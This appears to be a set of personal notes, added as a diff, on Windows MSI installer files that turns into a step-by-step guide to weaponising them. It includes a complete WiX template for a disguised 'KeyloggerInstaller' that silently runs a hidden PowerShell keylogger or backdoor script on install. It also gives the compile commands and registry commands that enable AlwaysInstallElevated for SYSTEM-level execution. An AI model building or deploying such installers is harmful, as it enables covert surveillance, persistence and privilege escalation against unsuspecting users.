@@ -1,0 +1,184 @@
+                                MSI FILES
+                            ===============
+- MSI = Microsoft Installer File
+- Think of it like a .zip file with extra brains.
+- It's a database-driven installation package created with the Windows Installer framework.
+- It holds:
+    > Files to install
+    > What registry keys to set
+    > What shortcuts to create
+    > What services to register
+    > Custom actions (scripts, binaries, etc.)
+
+- So it's not like a .bat or .ps1 — it’s like a container that runs commands + installs things in order.
+
+
+            Database of Actions
+        ------------------------------------------------------
+MSIs contain a relational database internally. This database has a bunch of tables, like:
+Table Name              | 	What it does
+---------------------------------------------------------------------------
+File	                |   Which files to install and where
+Registry	            |   Registry keys to create or modify
+CustomAction	        |   Commands, scripts, EXEs to run during install
+InstallExecuteSequence	|   Order of operations during installation
+
+- You can literally open an MSI with a tool like Orca (by Microsoft) and see these tables. It's like SQL-lite for installers.
+
+
+         How MSI Files Are Created
+    -----------------------------------------------------------
+- They’re not handwritten like .ps1. They are built using:
+    Option 1: WiX Toolset (most common)
+        > XML-based system to define MSI behavior
+        > Requires Visual Studio or manual compilation
+        > You describe what the MSI should do in XML:
+            EG.
+                <Component Id="MaliciousPayload" Guid="...">
+                    <File Id="BadExe" Name="evil.exe" Source="C:\Tools\evil.exe" />
+                </Component>
+
+                    - You compile the WiX XML to MSI with candle.exe and light.exe
+
+
+    Option 2: msi-packager or msibuild tools
+        > You give it a folder and some metadata
+        > It builds the MSI for you (used more in automation)
+            EG.
+                msi-packager --input myscript.ps1 --output evil.msi
+
+                    * These are rare — most real MSI builders still use WiX.
+
+    
+    Option 3: Advanced Installer, NSIS, Inno Setup
+        > GUI-based installer builders
+        > You drag & drop files, set commands, and it compiles to MSI or EXE
+        > Less stealthy, but easy
+
+
+        How Attackers Use MSI Files for Malicious Stuff
+    --------------------------------------------------------
+- Step-by-step:
+    > They write a payload (PowerShell, EXE, Python compiled binary, etc.)
+    > Use WiX or Advanced Installer to embed the payload
+    > Add a CustomAction to:
+        EG.
+            <CustomAction Id="RunPayload" FileKey="BadExe" ExeCommand="" Execute="deferred" Return="ignore"/>
+
+    > During install, it runs the payload silently
+    > If AlwaysInstallElevated is on, it executes as SYSTEM
+
+
+             Can I Convert PS1 or Python to MSI?
+            ---------------------------------------------
+- Yes, but you wrap them — not "convert" directly.
+    Method 1: Wrap a PS1 in an EXE using PS2EXE
+        EG.
+            ps2exe.ps1 -inputFile yourscript.ps1 -outputFile evil.exe
+
+                > Then package evil.exe in your MSI.
+
+    
+    Method 2: Turn Python to EXE using pyinstaller
+        EG.
+            pyinstaller --onefile evil.py
+
+                > Then drop that EXE into an MSI as the payload.
+
+
+            Custom Actions: The "Script Runners"
+            ----------------------------------------
+- A CustomAction in MSI is the weapon:
+    > It runs during the install process
+    > Can be:
+        * CMD
+        * PowerShell
+        * VBScript
+        * EXE
+        * DLL
+
+
+              Summary: What Makes MSI So Dangerous?
+            ---------------------------------------------
+Feature	                 |   Why it’s Dangerous                         |
+-------------------------|----------------------------------------------|
+CustomActions	         |  Can execute scripts or EXEs at SYSTEM level |
+AlwaysInstallElevated	 |  Lets users install MSI as SYSTEM            |
+Registry Access	         |  Can stealthily write keys for persistence   |
+Stealth	                 |  Looks like a legit installer file           |
+Easy Whitelisting	     |  Companies often trust .msi files            |
+
+
+                BUILDING A CUSTOM MSI FROM .PS1
+            ---------------------------------------
+1. Build a Custom MSI from .ps1 – Let's Actually Do It
+    - Let’s say you’ve got this PowerShell script saved as:
+        EG.
+            C:\custom_scripts\logger.ps1
+
+                * And it logs keystrokes or creates a persistence backdoor (😏 purely for lab testing).
+
+
+2. Step-by-Step: Create MSI with WiX Toolset
+    Step 1: Install WiX Toolset
+        - Download the WiX Toolset (latest version)
+        - Also install the WiX Visual Studio Extension (optional)
+
+    Step 2: Create a WiX XML File
+        - Save this as malicious_msi.wxs
+            EG.
+                <?xml version="1.0" encoding="UTF-8"?>
+                <Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
+                <Product Id="*" Name="KeyloggerInstaller" Language="1033" Version="1.0.0.0" Manufacturer="Totally Legit Inc" UpgradeCode="A4A1FD30-45D6-4E7A-AF76-1234567890AB">
+                    <Package InstallerVersion="200" Compressed="yes" InstallScope="perMachine" />
+
+                    <MediaTemplate />
+                    
+                    <Directory Id="TARGETDIR" Name="SourceDir">
+                    <Directory Id="ProgramFilesFolder">
+                        <Directory Id="INSTALLFOLDER" Name="Keylogger" />
+                    </Directory>
+                    </Directory>
+
+                    <ComponentGroup Id="ProductComponents" Directory="INSTALLFOLDER">
+                    <Component Id="MainScript" Guid="*">
+                        <File Id="LoggerScript" Name="logger.ps1" Source="C:\custom_scripts\logger.ps1" />
+                        <Shortcut Id="RunLogger" Directory="INSTALLFOLDER" Name="RunLogger" Target="[SystemFolder]WindowsPowerShell\v1.0\powershell.exe" Arguments="-ExecutionPolicy Bypass -WindowStyle Hidden -File [INSTALLFOLDER]logger.ps1" />
+                    </Component>
+                    </ComponentGroup>
+
+                    <Feature Id="ProductFeature" Title="Logger" Level="1">
+                    <ComponentGroupRef Id="ProductComponents" />
+                    </Feature>
+
+                    <CustomAction Id="LaunchScript" FileKey="LoggerScript" ExeCommand="" Return="ignore" Execute="deferred" />
+                    <InstallExecuteSequence>
+                    <Custom Action="LaunchScript" After="InstallFinalize">NOT Installed</Custom>
+                    </InstallExecuteSequence>
+                </Product>
+                </Wix>
+
+    Step 3: Compile into MSI
+        - Open Developer Command Prompt for VS or PowerShell, then run:
+            EG.
+                candle malicious_msi.wxs
+                light malicious_msi.wixobj -out keylogger.msi
+
+                    * You'll get: keylogger.msi – your SYSTEM-ready installer
+
+
+3. Optional: Enable AlwaysInstallElevated (To Run As SYSTEM 😈)
+    - Add these keys to the registry to make the MSI install as SYSTEM:
+        EG.
+            Set-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -Type DWord -Value 1
+            Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -Type DWord -Value 1
+
+                * Now, any MSI run by any user runs as SYSTEM 💀
+
+| Component                                 | Purpose                               |
+| ----------------------------------------- | ------------------------------------- |
+| `.wxs` file                               | The "script" describing the installer |
+| `candle`                                  | Compiles `.wxs` to `.wixobj`          |
+| `light`                                   | Links `.wixobj` into `.msi`           |
+| `[INSTALLFOLDER]logger.ps1`               | Location of script after install      |
+| `CustomAction` + `InstallExecuteSequence` | Auto-runs script silently             |
